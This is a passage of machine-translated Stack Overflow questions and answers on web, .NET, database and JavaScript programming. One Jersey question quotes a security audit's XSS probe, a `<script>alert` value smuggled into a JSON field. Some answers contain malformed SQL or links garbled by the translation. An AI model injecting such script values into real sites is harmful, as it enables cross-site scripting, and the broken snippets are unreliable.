
```
$('a').mouseover(function (e) {
  var id = $(e.target).attr('id');
  switch (id){
    case "state1":
    // Set State1 in Hovermode
    break;
    .
    .
    . 
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:53:57.283

尝试这个：

获取对地图对象的引用

```
map = $("#world-map-gdp").vectorMap('get', 'mapObject'); 
```

使用此方法

```
map.setSelectedRegions(['IT']); 
```

就我而言，悬停意大利

我不确定这是否存在于所有地图类型中，但在世界上存在并且有效。

# c# - 为什么 System.Windows.Forms BeginInvoke 似乎在 WPF 中工作

> ID：14853925
> 
> 赞同：0
> 
> 时间：2013-02-13T12:46:56.040
> 
> 标签：c#

我对 WPF 有点陌生。在试验 WPF 及其线程模型时，我尝试做一些试验。

**我在MainWindow.xaml.cs**中运行了以下代码行。

```
 var sync = SynchronizationContext.Current; 
```

// 返回 System.Windows.Threading.DispatcherSynchronizationContext //

```
 var frm = new System.Windows.Form();
    IntPtr temp = frm.Handle;
    sync = SynchronizationContext.Current; 
```

// 仍然**同步**的是 System.Windows.Threading.DispatcherSynchronizationContext。所以我有点猜到如果 SynchronizationContext.Current 为空，System.Windows.Form 会创建 System.Windows.Forms.WindowsFormsSynchronizationContext。//

//现在是奇怪的部分。

```
 Thread th = new Thread(() =>
                           {
                                     Action strac = UpdateTextBox;
                                     frm.BeginInvoke(strac);
                           });
    th.Start();

    void UpdateTextBox()
    {
        textBox1.Text = "Abhik";
    } 
```

// 我尝试使用 System.Windows.Form 的 BeginInvoke 将请求编组回 UI 线程并更新 UI 控件。

**有效！！..**

可以请任何人告诉我为什么它有效。这是因为 WPF 控件和 winform 控件在 windows os 中共享相同的祖先，即 User32.dll 和 DispatcherSynchronizationContext 和 WindowsFormsSynchronizationContext 在内部做同样的事情。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:02:09.813

你是正确的，`WindowsFormsSynchronizationContext`只有在当前`AsyncOperationManager.SynchronizationContext`是`null`或基`SynchronizationContext`类的实例时才创建。

`BeginInvoke`and`Invoke`方法不使用`SynchronizationContext`. 相反，他们沿着控件的祖先查找第一个具有有效窗口句柄的控件，将委托添加到私有队列，并将私有消息发布到窗口。该`WndProc`例程在正确的线程上接收此消息并调用排队的委托。

# html - CSS - 将图像居中放置在另一个图像之上

> ID：14853929
> 
> 赞同：1
> 
> 时间：2013-02-13T12:47:06.867
> 
> 标签：html, css, less

我必须制作一个宽度为 100% 的图像的页面，该图像将位于页面的顶部（我将其称为“img1”）。

在 img1 上，我必须放置另一个图像，我将其称为“img2”，它将具有固定的像素大小并居中。

img2 将是一个表格的背景，所以我会在上面放一个表格。

我已经阅读了一些关于如何使用相对和绝对嵌套 div 将图像放在另一个图像顶部的帖子，但是我不能使用自动边距；在 img2 上，因为它有一个绝对位置，并且因为它的大小以 px 为单位，所以我什至不能以 % 为单位，因为它会根据屏幕大小移动。

我尝试了另一个选项，它使用两个嵌套的 div 和具有指定背景大小的背景图像（img1 的宽度为 100%，img2 的宽度为 500px），并将 img2 与 background-position 居中：它可以工作，但是然后是 img1 的 div （当然是空的，因为我使用的是背景图像），没有高度。

当我使用标签时，通过将 100% 的宽度放在 img1 上，高度是自动定义的，因为图像比例。但是现在有了背景图像，我无法告诉 div “嘿，请让你的身高适合你的背景图像”。

你有什么建议？我希望我已经很好地解释了我的问题。

非常感谢你

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:59:10.413

我不明白这一点：

> 在 img2 上，因为它有一个绝对位置，并且因为它的大小**以 px**为单位，所以我什至不能在 % 中放置一个左侧，因为它会根据屏幕大小移动。

您说 img2 具有固定大小，在我看来，这是绝对位置和负边距居中的完美案例。

假设您的 img2 是 200px 宽：

```
.img2 {
  position: absolute;
  top: 0px;
  left: 50%;
  margin-left: -100px /* negative half the width */
} 
```

如果 img2 有 % 大小，它将无法工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:00:31.817

您可以使用 CSS3[多个背景图像来做到这一点](http://www.css3.info/preview/multiple-backgrounds/)

这允许您指定多个背景，如下所示：

```
background-image: url(http://i153.photobucket.com/albums/s223/chibizim/110-baby-monkey.png), url(http://upload.wikimedia.org/wikipedia/commons/e/e6/Standing-stone-state-forest-tn1.jpg); 
```

[演示](http://jsfiddle.net/XnNfU/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:58:31.627

尝试让您的基本图像`absolute`和应该放在顶部的图片`relative`同时`z-index`用于叠加，然后如果我正确理解了您的问题，它应该可以工作

# css - 应用 CSS 时 DNN 文本编辑器不工作

> ID：14853932
> 
> 赞同：0
> 
> 时间：2013-02-13T12:47:14.107
> 
> 标签：css, dotnetnuke

当我们应用 CSS 时，DNN Texteditor 是否不起作用？

我看到以下错误： `'System.Web.UI.UserControl' does not contain a definition for 'Mode' and no extension method 'Mode' accepting a first argument of type 'System.Web.UI.UserControl' could be found (are you missing a using directive or an assembly reference?)`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T15:13:16.523

看起来您遇到了一个文本编辑器控件类型未知的问题，因此当您从代码隐藏访问它时，它的类型是 a `UserControl`，而不是 a `DotNetNuke.UI.UserControls.TextEditor`。

这是因为您引用了来自 DotNetNuke 源的控件，它不是模块项目的一部分，因此 Visual Studio 不知道您在说什么。解决此问题的第一种方法是将控件的声明从设计器文件移动到您的代码隐藏，并将类型更改为`TextEditor`而不是`UserControl`.

解决此问题的更好方法是将项目的属性更改为指向 DNN 站点，以便 Visual Studio*可以*了解控件。这需要让您的项目位于向 IIS 注册的 DNN 站点内。然后，您可以转到项目设置中的 Web 选项卡，然后在*Servers*部分中，选中*Use Local IIS Web server*单选按钮。然后将*Project Url*设置为指向您模块的文件夹（例如`http://dnndev.me/DesktopModules/MyModule`）。选中*Override application root URL*复选框，并在此处输入站点的根目录（例如`http://dnndev.me`）。这*应该*允许 Visual Studio 找到控件并从中解析正确的类型。您可能需要在 ascx 控件中进行更改并重新保存它，然后才能正确更新它。

# php - 将 tumblr 帖子导入 wordpress 博客

> ID：14853934
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:47:18.767
> 
> 标签：php, wordpress, tumblr

当我在我的 tumblr 帐户中添加新帖子时，该 tumblr 帖子将自动与我的 wordpress 帐户同步。在同步时我不必登录 wordpress。简而言之，tumblr 帖子将自动显示到 wordpress 博客。我不知道它将如何工作。如果任何机构有任何符合我要求的插件或 api。我将非常感谢。

我正在使用这个插件：- [http://wordpress.org/extend/plugins/tumblr-importer/](http://wordpress.org/extend/plugins/tumblr-importer/)

但问题是每次在 tumblr 中添加帖子时我都必须导入。希望这是有道理的。这对我来说真的很烦人。TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:55:42.823

你必须每次都这样做。

在 WP.com 博客中复制类似的内容会导致 Google 认为您是垃圾邮件发送者，在网络上传播相同的材料（您想要这样做）。然后，他们将大大降低两个博客的搜索引擎排名；Tumblrs 几乎没有 Googlejuice，但 WP 博客有很多，这会破坏它。

WordPress.com 不是聚合器；这是一个博客平台。Facebook、Friendfeed 以及在较小程度上的 Tumblr 都是聚合器。您可以从 WP.com 博客拉取到 Tumblr、FB、FF 等，但反之则不行。工作人员已经进行了设置，因此这里的内容必须是这里的原创内容。

# mysql - mysql date_format 需要以字符串形式返回

> ID：14853935
> 
> 赞同：2
> 
> 时间：2013-02-13T12:47:24.300
> 
> 标签：mysql, string, date, vbscript

我有一个小的 sql 查询，它获取日期时间列的日期部分

```
Select DATE_FORMAT(`tbldata`.`fldDate`, '%d/%m/%Y') AS formattedDate from tbldata 
```

如何将其转换为字符串？

我在 vbscript 文件中运行 sql 查询并将返回的数据添加到 excel 电子表格中。

但是，脚本失败，因为返回的数据是日期类型。

有没有办法确保从 mysql 返回的日期是字符串而不是日期？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:52:44.180

该[`DATE_FORMAT()`](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format)函数的全部目的是创建一个字符串。如果你没有得到一个字符串，你正在做其他事情（你的 SQL 有语法错误，所以你可能已经去掉了一些东西来发布在这里）。

**编辑：**嗯，你得到一个`DATE_FORMAT()`允许任意输出的日期类型真的很奇怪。我想知道如果你运行例如这个会发生什么：

```
Select DATE_FORMAT(`tbldata`.`fldDate`, 'Hellow, World, today it is %m') AS formattedDate
from tbldata 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:52:35.243

您可以使用 CAST() 函数来实现这一点，您的 SQL 将是这样的：

```
Select CAST( DATE_FORMAT(`tbldata`.`fldDate`, '%d/%m/%Y'),"bb") AS CHAR) AS formattedDate from tbldata 
```

这里是 CAST 函数的参考：http: [//dev.mysql.com/doc/refman/5.0/en/cast-functions.html#function_cast](http://dev.mysql.com/doc/refman/5.0/en/cast-functions.html#function_cast)

玩得开心 ！:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:48:45.507

日期*是*MySQL 中的字符串。但如果你真的想确定使用[`Cstr()`](http://support.technetex.ca/devguide/vbscript_functions.aspx)：

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-14T07:14:16.743

*> 有没有办法保证mysql返回的日期是字符串而不是日期？*

就在这里 -

*   使用您的查询创建一个视图。
*   检查表中的列数据类型`information_schema.columns`。

例如：

```
SELECT * FROM `information_schema`.`columns`
WHERE table_schema = 'database name' AND table_name = 'view name' 
```

# javascript - 调试显示模块模式：函数在调用之前不在范围内？

> ID：14853938
> 
> 赞同：7
> 
> 时间：2013-02-13T12:47:29.463
> 
> 标签：javascript, scope, closures, google-chrome-devtools

如果我在 Chrome 开发人员工具中运行此代码：

```
var test = (function () {

  var publicFunction,
      privateFunction1,
      privateFunction2;

  privateFunction1 = function privateFunction1() {
    return true;
  };

  privateFunction2 = function privateFunction2() {
    return true;
  };

  publicFunction = function publicFunction() {
    privateFunction1();
    debugger;
  };

  return {
    publicFunction: publicFunction
  };
})(); 
```

为什么`privateFunction1`在断点范围内，而不在范围内`privateFunction2`？

![Chrome 开发工具截图](../Images/007ea1f75823fe618fc0ed6691d6962f.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T13:12:28.420

有趣的问题。

`privateFunction2` **在**范围内`publicFunction`，但`publicFunction`从未实际使用它。我相信您在调试器中看到的是因为 V8（Chrome 的 JavaScript 引擎）出于各种原因（包括最小化内存使用）优化了闭包的内容。

理论上，根据规范，`publicFunction`关闭（具有持久引用）定义范围内的所有符号。具体来说，为调用最外层的匿名函数创建了一个[*执行上下文，并且该执行上下文具有一个*](http://www.ecma-international.org/ecma-262/5.1/#sec-10.3)[*词法环境*](http://www.ecma-international.org/ecma-262/5.1/#sec-10.2)，该环境具有一个关联的[*绑定对象*](http://www.ecma-international.org/ecma-262/5.1/#sec-10.2.1.2)，该对象`publicFunction`具有隐式的匿名引用。该绑定对象在其上具有（理论上）名称`publicFunction`、`privateFunction1`、`privateFunction2`和其他一些东西（`arguments`等等）的属性。

但问题是，`publicFunction`它实际上并没有引用任何东西`privateFunction1`，而且它的代码已经到位，它**不能**引用其他任何东西。要让它引用其他任何东西，您必须更改它的代码，当然 V8 会做出不同的决定。中的代码`publicFunction`没有`eval(string)`or`new Function(string)`调用，因此 V8 可以自由地对其引用的符号进行静态分析。这意味着，在没有调试器的情况下，绑定对象保留这些其他属性毫无意义。它们从未被使用过。

由于 V8 是一个积极优化的编译器（是的，编译器），显然它从执行上下文的绑定对象中删除了死属性。

如果我添加一些用于任何`publicFunction`用途`privateFunction2`的东西，然后我可以像我一样从控制台引用它`privateFunction1`。

# java - 如何在解组 JSON 数据期间处理解析器异常？

> ID：14853939
> 
> 赞同：8
> 
> 时间：2013-02-13T12:47:39.420
> 
> 标签：java, json, parsing, jersey, pojo

我在我的 Web 应用程序中使用 Jersey。发送到服务器的数据为 JSON 格式，在服务器端依次解组，获取的对象用于进一步处理。安全审计为这种方法提出了一些漏洞。

我的休息代码：

```
@POST
@Path("/registerManga")
@Produces(MediaType.APPLICATION_JSON)
public Response registerManga(MangaBean mBean){
    System.out.println(mBean);
    return Response.status(200).build();
} 
```

漫画豆：

```
public class MangaBean {
    public String title;
    public String author;

    @Override
    public String toString() {
        return "MangaBean [title=" + title + ", author=" + author + "]";
    }
    public String getTitle() {
        return title;
    }
    public void setTitle(String title) {
        this.title = title;
    }
    public String getAuthor() {
        return author;
    }
    public void setAuthor(String author) {
        this.author = author;
    }

} 
```

数据以这种格式发送：

```
["title":"Bleach","author":"kubo tite"] 
```

上述数据已成功解组为一个对象，我将其作为输出：

```
MangaBean [title=Bleach, author=kubo tite] 
```

但是如果数据改成：

```
["title":"<script>alert("123");</script>","author":"kubo tite"] 
```

发生 500 内部服务器错误并向用户显示：

```
javax.servlet.ServletException: org.codehaus.jackson.JsonParseException: Unexpected character ('1' (code 49)): was expecting comma to separate OBJECT entries
 at [Source: org.apache.catalina.connector.CoyoteInputStream@19bd1ca; line: 1, column: 28]
    com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:420)
    com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:537)
    com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:699)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

的意外发生`""`导致解析器出错。由于解组是在幕后完成的，我无法控制它，我无法处理引发的异常。

我的问题是如何处理此异常并向用户返回正确的响应而不是堆栈跟踪。请指教。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-13T12:56:21.033

注册一个异常映射器来处理 JSON 解析异常：

```
@Provider
class JSONParseExceptionMapper implements ExceptionMapper< JsonParseException > {
    @Override
    public Response toResponse(final JsonParseException jpe) {
        // Create and return an appropriate response here
        return Response.status(Status.BAD_REQUEST)
                .entity("Invalid data supplied for request").build();
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-08-18T20:12:20.837

如果未调用此异常映射器（如 John Ding 的评论所示），请确保已将其注册到 ResourceConfig。

另外，请注意，当使用 JacksonFeature（使用 Jersey 2.x）时，它包含一个异常映射器，但如果您注册自己的异常映射器，它将优先。

下面是一个按包注册的例子。因此，将 JSONParseExceptionMapper 放在“your.package.here”中，它就会被拾取。

```
@ApplicationPath("whatever")
public class MyAppResourceConfig extends ResourceConfig
{
    public MyAppResourceConfig()
    {
        packages("your.package.here");
        register(JacksonFeature.class);
    }
} 
```

对于原始问题，您还需要处理 JsonMappingExceptionMapper 。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-03-01T19:23:05.940

除了@Perception 的回答之外，缺少的部分是异常被吞没而不被报告。您应该传递一个验证侦听器：

```
private static final String[] severity = new String[] {"Warning", "Error", "Fatal Error"};
void beforeUnmarshal(Unmarshaller u, Object parent) throws JAXBException {
    u.setEventHandler((evt) -> {
        throw new WebApplicationException(severity[evt.getSeverity()]+": Error while parsing request body: " + evt.getMessage(), evt.getLinkedException(), 400);
    });
} 
```

只需将此代码放入您的 JAXB bean 和您的所有设置中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-11T12:36:03.043

添加感知答案的完整类示例

```
package com.shashi.service;

import javax.ws.rs.core.Response;
import javax.ws.rs.ext.ExceptionMapper;
import javax.ws.rs.ext.Provider;

import org.apache.log4j.Logger;

import org.codehaus.jackson.JsonParseException;
import com.sun.jersey.api.client.ClientResponse.Status;
import com.talklingo.service.v1.UserManagementService;
@Provider
public class JSONParseExceptionMapper implements ExceptionMapper< JsonParseException > {

 private static Logger logger = Logger
   .getLogger(JSONParseExceptionMapper.class);

   public Response toResponse(final JsonParseException jpe) {
         // Create and return an appropriate response here

         return Response.status(Status.BAD_REQUEST)
                 .entity("Invalid data supplied for request").build();

     }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-09-30T09:52:44.273

另一个选项可以在 ResourceConfig 中，注册 JsonParseExceptionMapper 类。

注册（JsonParseExceptionMapper.class）；

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-04-14T04:22:01.940

在 web.xml 文件中提到的同一个包（或子包）中添加异常处理类

# php - 将 imap_search 与 Godaddy 托管的电子邮件帐户一起使用？

> ID：14853940
> 
> 赞同：0
> 
> 时间：2013-02-13T12:47:40.773
> 
> 标签：php, imap-open

我在`imap_search()`使用 Godaddy 托管的电子邮件帐户时遇到问题。

`imap_open()`我创建了一个脚本，它使用 PHP 和and函数连接到 3 个邮箱，`imap_search()`然后循环浏览所有电子邮件并收回我需要的特定信息。

它适用于其他 2 个帐户，1 个使用 gmail 托管，另一个使用自托管。使用 Godaddy 帐户，我没有托管他们，他们只托管我们的电子邮件，我们的网站托管在其他地方。

我可以正常连接到邮件服务器`imap_open()`而不会出现错误，但是当我使用`imap_search($inbox,'UNSEEN')`它时不会返回任何电子邮件，我尝试将“UNSEEN”更改为“ALL”，但它仍然没有检索任何电子邮件。

我使用的 imap_open 主机值是`{imap.secureserver.net:993/imap/ssl}INBOX`

我不知道之前是否有人对此有任何问题，在我等待 GoDaddy 的回复期间，我知道这里的用户通常会更快地回复和提供更多信息，所以我在这里询问社区。

如果我在函数之后运行 echo 命令，`imap_open()`我可以在屏幕上看到它，所以我知道它在脚本中已经走得那么远，它只是为`imap_search()`请求返回一个空白的电子邮件数组。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T09:30:41.663

我收到了 GoDaddy 的回复，其中包含以下信息，以防其他人发现自己和我在同一条船上。

> 感谢您联系在线支持。我们的 IMAP 服务器不允许来自外部服务器的连接。这在邮件服务器安全设置和防火墙中被阻止。对于给您带来的不便，我们深表歉意，但这些设置不会被修改以支持 imap_search()。感谢您对此事的理解。

这很令人沮丧，但至少我有一个答案。我将不得不将我的电子邮件转移到 Google Apps 或类似的设备上，以使它们能够在我的服务器上使用`imap_open()`/运行。`imap_search()`

# c++ - 读取数组格式输入

> ID：14853943
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:47:50.240
> 
> 标签：c++, arrays, input

请您帮忙获取这种格式的输入：

```
{1,2,3,4} 
```

并将其转换为整数数组？

```
 int * ns = new int [n];
    cin >> ns; 
```

这不起作用。我应该如何改变它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:02:59.043

您需要一个一个地读取元素并将它们存储到数组中。

```
int aNoOfElements = 0;
cin >> aNoOfElements;
int *anArray = new int[ aNoOfElements];     //allocate memory to hold aNoOfElements

for( int i = 0; i < aNoOfElements; i++ )
{
     cin >> anArray[ i ];                   // Read each input
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:50:47.067

```
using namespace std;
typedef istream_iterator<int> It;
vector<int> v;
copy(It(cin), It(), back_inserter(v)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T13:07:58.940

您需要解析输入。将输入作为字符串，然后检查符合您想要的格式。您可以使用的算法：

1.  检查第一个字符是否为'{'
2.  如果是，则初始化一个变量（例如 temp）以保存您将要获取的数字（作为字符串），并使用空字符串，否则出错
3.  读取下一个字符
4.  如果它在 '0' 和 '9' 之间，则将其附加到 temp 并返回步骤 3，否则转到步骤 5
5.  如果是逗号或'}'，则将temp转换为整数并将其放入数组中，用空字符串重新初始化temp，否则出错
6.  仍然在同一个字符上，如果是逗号则返回步骤 3，否则完成

我希望你能把上面的算法变成工作代码，祝你好运:)

PS：如果您发现错误，请随时告诉我

# image - 有一个使用 2 个过滤器的 SVG 元素

> ID：14853949
> 
> 赞同：2
> 
> 时间：2013-02-13T12:48:08.633
> 
> 标签：image, html, svg, svg-filters

我有一个 SVGimage 元素，我希望该图像使用 feOffset、feGaussianBlur 等具有阴影。

同时，我需要设置图像的亮度和对比度，

我尝试了以下代码：

```
<image x="10" y="100" width="440" height="60" xlink:href="/images/pulpit.jpg" preserveAspectRatio="defer" filter="url(#drop)"></image>
<defs>
<filter id="drop" filterUnits="userSpaceOnUse">
  <feComponentTransfer in="SourceAlpha" result="doo">
    <feFuncR type="discrete" tablevalues="3" />

  </feComponentTransfer>
  <feOffset dx="80" dy="0" result="shadow"  in="doo" />
  <feGaussianBlur stdDeviation="20 0" in="shadow" result="blurOut"/>
  <feBlend in="SourceGraphic" in2="blurOut" />

  <feComponentTransfer in="SourceGraphic">
    <feFuncR type="linear" slope="0.4" />
  </feComponentTransfer>
</filter>
<defs>
</svg> 
```

但它最终只使用了最后一个过滤器（第二个 feComponentTransfer），有什么想法可以同时应用这两个过滤器吗？

第一个 feComponentTransfer 直到 feBlend 是创建阴影，第二个 feComponentTransfer 是设置图像本身的亮度（不是阴影）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:09:34.577

大概 feComponentTransfer 的 in 应该是 blurOut 而不是作为原始输入的 SourceGraphic。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-23T01:06:02.203

最好将“结果”和“输入”明确添加到您的过滤器中，这样您就可以跟踪什么是什么。这就是让你在这里绊倒的原因。就目前而言，您有两个以 blurOut 结尾的过滤器链和一个未命名的最终结果。您需要重做操作顺序以分别调整源图形，然后将其合成在阴影之上。代码如下。并且...

一些清理工作：

1.  如果您不打算在过滤器上设置尺寸，则无需设置过滤器单位。
2.  feComponentTransfer 上限值大于 1，楼层值小于 0，因此 3 - 可以是 1。
3.  这是 Mozilla 中的一个错误，当数组中只有一个值时，它不会为您提供正确的颜色转换 - 您应该重复该值两次，现在可以在 firefox 中使用。

工作代码是：

```
<filter id="drop">
  <feComponentTransfer in="SourceAlpha" result="doo">
    <feFuncR type="discrete" tableValues="1 1" />
  </feComponentTransfer>

  <feOffset dx="80" dy="0"  in="doo" result="shadow"/>
  <feGaussianBlur stdDeviation="20 0" in="shadow" result="blurOut"/>

  <feComponentTransfer in="SourceGraphic" result="unbrightsource">
    <feFuncR type="linear" slope="0.4" />
  </feComponentTransfer>

  <feBlend mode="normal" in="unbrightsource" in2="blurOut" result="final"/>

</filter> 
```

# blackberry-webworks - BB10 作为 Web 应用程序是否支持 SMS？还有其他选择吗？

> ID：14853951
> 
> 赞同：1
> 
> 时间：2013-02-13T12:48:10.637
> 
> 标签：blackberry-webworks, blackberry-10

我在他们的 api 文档中寻找这个，只是看到 BB5-BB7 支持它而不是 BB10。这对我来说听起来倒退了，但让我知道这是否仍然是这种情况，以及是否有解决方法来解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T04:31:52.737

SMS 仍在为 BB10 Webworks 开发中。有一种可能的解决方法。虽然它不允许您指定电话号码，但用户必须手动输入。

您可以使用[**“共享目标”示例**](https://github.com/blackberry/BB10-WebWorks-Samples/tree/master/ShareTargets)。你传给它一个字符串、照片、视频等。然后它向用户显示可能的共享目标列表，其中一个是

![在此处输入图像描述](../Images/165cf28642674ebbd368960b6a6acc65.png)

文档：http: [//developer.blackberry.com/html5/apis/blackberry.invoke.card.html#.invokeTargetPicker](http://developer.blackberry.com/html5/apis/blackberry.invoke.card.html#.invokeTargetPicker)

类似的问题/答案：[https ://stackoverflow.com/a/15074654/773263](https://stackoverflow.com/a/15074654/773263)

# database - MS Access - 在查询中运行宏 - 时间转换

> ID：14853952
> 
> 赞同：0
> 
> 时间：2013-02-13T12:48:13.703
> 
> 标签：database, vba, ms-access, datetime, time

我正在尝试从各种表中选择数据。唯一的问题是，在一个表中，时间的格式是“从午夜开始的正分钟数”，而所有其他表都以某种标准的 TIME 格式存储时间。这使我无法加入这些。除此之外，向其他表添加另一列是不可能的。所以我的解决方案如下：

**1\. 从表中获取从午夜开始的日期和分钟**

**2\. 创建时间/日期对象（我猜是使用 VB）**

**3\. 将 MINUTES 添加到时间/日期对象**

但我不知道在哪里或如何做到这一点。我将不得不创建一个报告，对吧？如果有人能指出我正确的方向，我会很高兴。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:53:42.600

这里不需要VBA。您可以创建一个查询，在其中将时间转换为正确的格式。然后将第二个表加入到这个查询中。

您可以在查询生成器中使用此公式转换时间：

```
[日期]+[MinFromMidnight]/1440

```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:53:21.437

“从午夜开始的正分钟数” - 用于此用途`X / 60 / 24`。获得的值可能会被添加到日期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:52:22.687

您可以创建第一个表的视图（选择查询），其中包括作为计算字段的时间。然后，您可以将视图加入到其余表格中。

# node.js - Mongoose 嵌套填充查询

> ID：14853953
> 
> 赞同：5
> 
> 时间：2013-02-13T12:48:18.850
> 
> 标签：node.js, mongodb, mongoose

我正在尝试返回与特定用户 ID 关联的优惠券列表并填充 _merchant 引用。

此查询正确填充 _merchant 引用。如果我可以补充：

我的查询中的 coupon.users.contains(myuserid) 会得到我需要的东西

```
db.couponModel.find().populate('_merchant').exec(function(err, coupons) { 
    res.send(coupons);
}); 
```

或者此查询找到我需要的正确优惠券。如果我可以补充：

populate(_merchant) 到我的查询中，这也将得到我需要的东西。

```
db.userModel.findById(req.params.id).populate('coupons').exec(function(err, user) {
    res.send(user.coupons)
}); 
```

模式

```
var userSchema = new Schema({
    email: { type: String, required: true , unique: true },
    coupons: [{ type: Schema.ObjectId, ref: 'Coupon' }]
});

var couponSchema = new Schema({
    _merchant: { type: Schema.ObjectId, ref: 'Merchant', required: true },
    couponid: { type: Number, required: true, unique: true },
    users: [{ type: Schema.ObjectId, ref: 'User' }]

});

var merchantSchema = new Schema({
    name: { type: String, required: true , unique: true }
    coupons: [{ type: ObjectId, ref: 'Coupon' }],

}); 
```

我需要这两个查询的混合来获得我想要的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-14T07:05:22.540

使用 $all 选项解决了这个问题。这里的例子：[https ://github.com/LearnBoost/mongoose/blob/master/test/query.test.js#L396](https://github.com/LearnBoost/mongoose/blob/master/test/query.test.js#L396) [http://docs.mongodb.org/manual/reference/operator/all/#_S_all](http://docs.mongodb.org/manual/reference/operator/all/#_S_all)

最终查询代码：

```
db.couponModel.find({users: {$all:[req.params.id]}}).populate('_merchant').exec(function(err, coupons) { console.log(coupons); }) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-29T07:27:10.423

使用**$all**选项。db.couponModel.find({users: {$all:[req.params.id]}}).populate('_merchant').exec(function(err, coupons) { console.log(coupons); })

# php - 了解 JRoute::_( 'index.php' ); 的路径 Joomla 1.5

> ID：14853958
> 
> 赞同：0
> 
> 时间：2013-02-13T12:48:37.393
> 
> 标签：php, joomla, joomla1.5, recaptcha

我正在尝试[根据这些说明在 Joomla 1.5 的联系人管理器模块中实现 reCaptcha](https://developers.google.com/recaptcha/docs/php)。我有以下看起来像这样的表格：

```
<form action="<?php echo JRoute::_( 'index.php' );?>" method="post" name="emailForm" id="emailForm" class="form-validate">
        <div class="contact_email<?php echo $this->escape($this->params->get('pageclass_sfx')); ?>">
            <label for="contact_name">
                &nbsp;<?php echo JText::_( 'Enter your name' );?>:
            </label>
            <br />
            <input type="text" name="name" id="contact_name" size="30" class="inputbox" value="" />
            <br />
            <label id="contact_emailmsg" for="contact_email">
                &nbsp;<?php echo JText::_( 'Email address' );?>:
            </label>
            <br />
            <input type="text" id="contact_email" name="email" size="30" value="" class="inputbox required validate-email" maxlength="100" />
            <br />
            <label for="contact_subject">
                &nbsp;<?php echo JText::_( 'Message subject' );?>:
            </label>
            <br />
            <input type="text" name="subject" id="contact_subject" size="30" class="inputbox" value="" />
            <br /><br />
            <label id="contact_textmsg" for="contact_text">
                &nbsp;<?php echo JText::_( 'Enter your message' );?>:
            </label>
            <br />
            <textarea cols="50" rows="10" name="text" id="contact_text" class="inputbox required"></textarea>
            <?php if ($this->contact->params->get( 'show_email_copy' )) : ?>
            <br />
                <input type="checkbox" name="email_copy" id="contact_email_copy" value="1"  />
                <label for="contact_email_copy">
                    <?php echo JText::_( 'EMAIL_A_COPY' ); ?>
                </label>
            <?php endif; ?>
            <br />
            <br />
            <button class="button validate" type="submit"><?php echo JText::_('Send'); ?></button>
        </div>

    <input type="hidden" name="option" value="com_contact" />
    <input type="hidden" name="view" value="contact" />
    <input type="hidden" name="id" value="<?php echo $this->contact->id; ?>" />
    <input type="hidden" name="task" value="submit" />
    <?php echo JHTML::_( 'form.token' ); ?>
</form> 
```

在该`index.php`文件中，我需要添加一些额外的代码，以便在提交表单时，在验证和发送表单之前检查代码。

我假设并且因此我在这里的原因是 index.php 指的是根`index.php`文件？或者如果我错了，`JRoute::_( 'index.php' );`指向哪里？

然后，在该索引文件中，我需要像这样引用*recaptchalib.php*：

```
 require_once('templates/templatename/html/com_contact/contact/recaptchalib.php'); 
```

我希望这是从 index.php 文件中引用 recaptchalib.php 的正确方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T23:27:53.017

JRoute::_("index.php") 确实是根 index.php。但是您发布的表格不完整，它丢失了

```
<input type='hidden' name='option' value='mycomponent'
<input type='hidden' name='task' ... 
```

option 是组件的名称，因此处理您的请求的文件是 /components/com_mycomponent/mycomponent.php。

在此类组件中调用的函数可以由参数“任务”指定。

此外，通常会指定控制器、视图和布局。

我想你应该在视图中插入你的 recaptcha 要求。

阅读有关 Joomla MVC 或至少 MVC 的一些信息，并从核心组件中学习 :-)

# linux - 将 perl 的一部分传递给 bc

> ID：14853965
> 
> 赞同：2
> 
> 时间：2013-02-13T12:48:52.060
> 
> 标签：linux, perl, replace, bc

我正在尝试编写一个命令，为我提供一些有关 linux 系统的信息。该命令应该是单行的。它应该代表中断、进程和上下文切换的总量。

我对 linux 世界很陌生，所以这对我来说并不容易。到目前为止，我发现了这个：

```
